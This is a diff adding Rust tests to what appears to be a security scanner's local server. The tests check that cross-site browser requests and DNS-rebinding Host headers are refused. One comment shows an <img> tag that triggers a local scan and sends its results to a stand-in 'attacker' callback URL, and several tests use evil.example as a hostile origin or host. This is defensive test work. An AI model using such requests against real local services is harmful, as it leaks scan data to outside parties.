@@ -32,6 +32,9 @@ fn make_state(
         scan_timeout: None,
         // 0 = unlimited so existing tests aren't rejected by the concurrency cap.
         max_concurrent_scans: 0,
+        allowed_hosts: vec![],
+        // 0 = unlimited, so a test that stages jobs by hand keeps all of them.
+        max_retained_scans: 0,
         last_purge_ms: Arc::new(std::sync::atomic::AtomicI64::new(0)),
         preflight_sem: Arc::new(tokio::sync::Semaphore::new(MAX_CONCURRENT_PREFLIGHT)),
     }
@@ -1840,6 +1843,8 @@ async fn test_run_server_returns_on_invalid_bind_address() {
         rate_limit: None,
         scan_timeout: None,
         max_concurrent_scans: 100,
+        allowed_hosts: None,
+        max_retained_scans: 1000,
         max_body_bytes: 1_048_576,
         allowed_origins: None,
         jsonp: false,
@@ -1865,6 +1870,8 @@ async fn test_run_server_returns_on_bind_failure_after_state_build() {
         rate_limit: None,
         scan_timeout: None,
         max_concurrent_scans: 100,
+        allowed_hosts: None,
+        max_retained_scans: 1000,
         max_body_bytes: 1_048_576,
         allowed_origins: Some(
             "*,regex:^https://.*\\.example\\.com$,https://*.corp.local".to_string(),
@@ -3890,4 +3897,283 @@ fn test_scan_options_cookie_list_drops_empty_entries() {
     // An all-empty list is the same as not sending one at all.
     let opts: ScanOptions = serde_json::from_str(r#"{"cookies": ["", " "]}"#).unwrap();
     assert_eq!(opts.cookie, None);
+}
+
+// ---- Request-source gate: browser cross-site + Host (DNS rebinding) ----
+
+/// Query params that make `get_scan_handler` submit a real scan, so a gate
+/// test can assert on the "would have started a scan" path.
+fn scan_query() -> Map<String, String> {
+    let mut params = Map::new();
+    params.insert("target".to_string(), "http://127.0.0.1:1/".to_string());
+    params
+}
+
+fn header_map(pairs: &[(&str, &str)]) -> HeaderMap {
+    let mut headers = HeaderMap::new();
+    for (name, value) in pairs {
+        headers.insert(
+            axum::http::header::HeaderName::from_bytes(name.as_bytes()).expect("header name"),
+            HeaderValue::from_str(value).expect("header value"),
+        );
+    }
+    headers
+}
+
+#[tokio::test]
+async fn test_cross_site_browser_request_is_refused_and_starts_no_scan() {
+    // The core regression: a page the operator merely visits could fire
+    // `<img src="http://127.0.0.1:6664/scan?target=…&callback_url=http://attacker/">`,
+    // and the results were POSTed to the attacker without them ever reading a
+    // response. No API key is set here — that is the default configuration.
+    let state = make_state(None, None, false, false, "callback");
+
+    let resp = get_scan_handler(
+        State(state.clone()),
+        header_map(&[("Sec-Fetch-Site", "cross-site"), ("Sec-Fetch-Dest", "image")]),
+        Query(scan_query()),
+    )
+    .await
+    .into_response();
+
+    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
+    assert!(
+        state.jobs.lock().await.is_empty(),
+        "a refused request must not queue a scan"
+    );
+}
+
+#[tokio::test]
+async fn test_cross_site_gate_applies_to_every_authenticated_route() {
+    let state = make_state(None, None, false, false, "callback");
+    let cross_site = header_map(&[("Sec-Fetch-Site", "cross-site")]);
+
+    let scan = start_scan_handler(
+        State(state.clone()),
+        cross_site.clone(),
+        Query(Map::new()),
+        Ok(Json(ScanRequest {
+            target: "http://127.0.0.1:1/".to_string(),
+            options: None,
+        })),
+    )
+    .await
+    .into_response();
+    assert_eq!(scan.status(), StatusCode::FORBIDDEN);
+
+    let list = list_scans_handler(State(state.clone()), cross_site.clone(), Query(Map::new()))
+        .await
+        .into_response();
+    assert_eq!(list.status(), StatusCode::FORBIDDEN);
+
+    let result = get_result_handler(
+        State(state.clone()),
+        cross_site.clone(),
+        Path("whatever".to_string()),
+        Query(Map::new()),
+    )
+    .await
+    .into_response();
+    assert_eq!(result.status(), StatusCode::FORBIDDEN);
+
+    let cancel = cancel_scan_handler(
+        State(state.clone()),
+        cross_site.clone(),
+        Path("whatever".to_string()),
+        Query(Map::new()),
+    )
+    .await
+    .into_response();
+    assert_eq!(cancel.status(), StatusCode::FORBIDDEN);
+
+    // /health takes no API key but must still not answer a malicious page
+    // probing whether a dalfox server is listening on this machine.
+    let health = health_handler(State(state.clone()), cross_site, Query(Map::new()))
+        .await
+        .into_response();
+    assert_eq!(health.status(), StatusCode::FORBIDDEN);
+}
+
+#[tokio::test]
+async fn test_health_stays_open_without_an_api_key() {
+    // The gate must not turn /health into an authenticated endpoint.
+    let state = make_state(Some("secret"), None, false, false, "callback");
+    let resp = health_handler(State(state), HeaderMap::new(), Query(Map::new()))
+        .await
+        .into_response();
+    assert_eq!(resp.status(), StatusCode::OK);
+}
+
+#[tokio::test]
+async fn test_non_browser_client_is_unaffected_by_the_gate() {
+    // curl / CLI / agent clients send neither Origin nor Sec-Fetch-*; they must
+    // keep working exactly as before.
+    let state = make_state(None, None, false, false, "callback");
+    let resp = get_scan_handler(State(state.clone()), HeaderMap::new(), Query(scan_query()))
+        .await
+        .into_response();
+    assert_eq!(resp.status(), StatusCode::OK);
+    assert_eq!(state.jobs.lock().await.len(), 1);
+}
+
+#[tokio::test]
+async fn test_same_origin_and_direct_navigation_pass_the_gate() {
+    let state = make_state(None, None, false, false, "callback");
+
+    for site in ["same-origin", "none"] {
+        let resp = get_scan_handler(
+            State(state.clone()),
+            header_map(&[("Sec-Fetch-Site", site)]),
+            Query(scan_query()),
+        )
+        .await
+        .into_response();
+        assert_eq!(
+            resp.status(),
+            StatusCode::OK,
+            "Sec-Fetch-Site: {} must be allowed",
+            site
+        );
+    }
+}
+
+#[tokio::test]
+async fn test_configured_origin_is_allowed_and_others_are_not() {
+    // The legitimate cross-site case: an operator wiring up a web UI. It is
+    // cross-site by definition, so the Origin allow-list has to win over the
+    // fetch-metadata check.
+    let state = make_state(
+        None,
+        Some(vec!["http://localhost:3000", "regex:^https://ui\\.corp$"]),
+        false,
+        false,
+        "callback",
+    );
+    let mut state = state;
+    state.allowed_origin_regexes = vec![regex::Regex::new("^https://ui\\.corp$").unwrap()];
+
+    for origin in ["http://localhost:3000", "https://ui.corp"] {
+        let resp = get_scan_handler(
+            State(state.clone()),
+            header_map(&[("Origin", origin), ("Sec-Fetch-Site", "cross-site")]),
+            Query(scan_query()),
+        )
+        .await
+        .into_response();
+        assert_eq!(resp.status(), StatusCode::OK, "{} must be allowed", origin);
+    }
+
+    let resp = get_scan_handler(
+        State(state.clone()),
+        header_map(&[("Origin", "https://evil.example")]),
+        Query(scan_query()),
+    )
+    .await
+    .into_response();
+    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
+}
+
+#[tokio::test]
+async fn test_jsonp_mode_opts_out_of_the_cross_site_gate() {
+    // JSONP is served to `<script src>`, which carries no Origin to validate,
+    // so enabling it is an explicit decision to allow cross-origin reads.
+    // Pinning it here so the exception can't be removed by accident — or added
+    // to the non-JSONP path by accident.
+    let state = make_state(None, None, false, true, "cb");
+    let resp = get_scan_handler(
+        State(state.clone()),
+        header_map(&[("Sec-Fetch-Site", "cross-site")]),
+        Query(scan_query()),
+    )
+    .await
+    .into_response();
+    assert_eq!(resp.status(), StatusCode::OK);
+}
+
+#[tokio::test]
+async fn test_wildcard_origin_opts_out_of_the_cross_site_gate() {
+    let state = make_state(None, Some(vec!["*"]), true, false, "callback");
+    let resp = get_scan_handler(
+        State(state),
+        header_map(&[("Origin", "https://evil.example")]),
+        Query(scan_query()),
+    )
+    .await
+    .into_response();
+    assert_eq!(resp.status(), StatusCode::OK);
+}
+
+#[tokio::test]
+async fn test_untrusted_host_is_refused_but_ip_literals_and_localhost_pass() {
+    // DNS rebinding: the attacker's own hostname re-resolves to this machine,
+    // after which the browser calls the request same-origin and sends no
+    // Origin at all — so only the Host header still names the attacker.
+    let mut state = make_state(None, None, false, false, "callback");
+    state.allowed_hosts = vec!["dalfox.internal".to_string()];
+
+    let resp = get_scan_handler(
+        State(state.clone()),
+        header_map(&[("Host", "evil.example:6664"), ("Sec-Fetch-Site", "same-origin")]),
+        Query(scan_query()),
+    )
+    .await
+    .into_response();
+    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
+    assert!(
+        state.jobs.lock().await.is_empty(),
+        "a rebound request must not queue a scan"
+    );
+
+    // An IP literal can't be rebound, `localhost` is us, and an operator-listed
+    // name is explicitly trusted.
+    for host in [
+        "127.0.0.1:6664",
+        "127.0.0.1",
+        "[::1]:6664",
+        "localhost:6664",
+        "LOCALHOST",
+        "dalfox.internal:6664",
+    ] {
+        let resp = get_scan_handler(
+            State(state.clone()),
+            header_map(&[("Host", host)]),
+            Query(scan_query()),
+        )
+        .await
+        .into_response();
+        assert_eq!(resp.status(), StatusCode::OK, "Host {} must be allowed", host);
+    }
+}
+
+#[tokio::test]
+async fn test_retention_cap_evicts_oldest_finished_scans_only() {
+    let mut state = make_state(None, None, false, false, "callback");
+    state.max_retained_scans = 3;
+
+    {
+        let mut jobs = state.jobs.lock().await;
+        for (i, id) in ["old", "mid", "new"].iter().enumerate() {
+            let mut job = test_job(JobStatus::Done, None, "http://example.com");
+            job.finished_at_ms = Some(1_000 + i as i64);
+            jobs.insert((*id).to_string(), job);
+        }
+        // Still running: must survive eviction even though it is the oldest.
+        let mut running = test_job(JobStatus::Running, None, "http://example.com");
+        running.queued_at_ms = 1;
+        jobs.insert("running".to_string(), running);
+    }
+
+    let id = try_admit_and_queue(&state, "http://example.com/new", None)
+        .await
+        .expect("admission succeeds");
+
+    let jobs = state.jobs.lock().await;
+    assert!(jobs.contains_key(&id), "the new scan is retained");
+    assert!(
+        jobs.contains_key("running"),
+        "an active scan must never be evicted"
+    );
+    assert!(!jobs.contains_key("old"), "the oldest finished scan is evicted");
+    assert!(!jobs.contains_key("mid"), "eviction continues until at cap");
+    assert!(jobs.contains_key("new"), "the newest finished scan survives");
 }
